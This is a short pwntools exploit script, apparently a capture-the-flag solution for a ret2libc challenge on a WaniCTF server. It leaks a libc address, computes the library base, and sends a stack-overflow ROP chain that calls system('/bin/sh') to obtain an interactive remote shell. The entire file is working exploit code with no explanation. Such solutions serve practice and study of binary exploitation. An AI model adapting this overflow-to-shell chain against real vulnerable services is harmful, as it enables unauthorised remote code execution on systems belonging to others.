from pwn import *
import sys

elf = ELF("chall")
libc = ELF("libc.so.6")

# io = process(elf.path)
io = remote("ret2libc-pwn.wanictf.org", 9005)

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h", "-F" "#{pane_pid}", "-P"]

libc_start_call_main_ofs = 0x29D10

io.recvuntil(b"+0x28 | ")
r = io.recv(18)
libc.address = int(r.decode(), 16) - libc_start_call_main_ofs - 128

p = b"A" * 0x28
p += p64(next(libc.search(asm("pop rdi; ret"), executable=True)))
p += p64(next(libc.search(b"/bin/sh\x00")))
p += p64(next(libc.search(asm("pop rsi; ret"), executable=True)))
p += p64(0)
p += p64(next(libc.search(asm("ret"), executable=True)))
p += p64(libc.sym["system"])
p += b"\x00" * (128 - len(p))
io.send(p)

io.interactive()
